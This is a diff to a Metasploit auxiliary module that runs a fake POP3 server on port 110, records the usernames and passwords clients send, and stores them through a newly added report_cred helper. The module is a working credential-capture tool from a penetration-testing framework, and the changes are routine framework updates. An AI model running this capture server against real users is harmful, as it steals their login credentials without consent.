@@ -1,14 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-require 'msf/core'
-
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::TcpServer
   include Msf::Auxiliary::Report
 
@@ -36,7 +31,7 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 110 ])
-      ], self.class)
+      ])
   end
 
   def setup
@@ -47,13 +42,38 @@ class Metasploit3 < Msf::Auxiliary
   def run
     @myhost = datastore['SRVHOST']
     @myport = datastore['SRVPORT']
-    print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
     exploit()
   end
 
   def on_client_connect(c)
     @state[c] = {:name => "#{c.peerhost}:#{c.peerport}", :ip => c.peerhost, :port => c.peerport, :user => nil, :pass => nil}
     c.put "+OK\r\n"
+  end
+
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
   end
 
   def on_client_data(c)
@@ -71,16 +91,15 @@ class Metasploit3 < Msf::Auxiliary
     if(cmd.upcase == "PASS")
       @state[c][:pass] = arg
 
-      report_auth_info(
-        :host      => @state[c][:ip],
-        :port      => @myport,
-        :sname     => 'pop3',
-        :user      => @state[c][:user],
-        :pass      => @state[c][:pass],
-        :source_type => "captured",
-        :active    => true
+      report_cred(
+        ip: @state[c][:ip],
+        port: @myport,
+        service_name: 'pop3',
+        user: @state[c][:user],
+        password: @state[c][:pass],
+        proof: arg
       )
-      print_status("POP3 LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
+      print_good("POP3 LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
       @state[c][:pass] = data.strip
       c.put "+OK\r\n"
       return
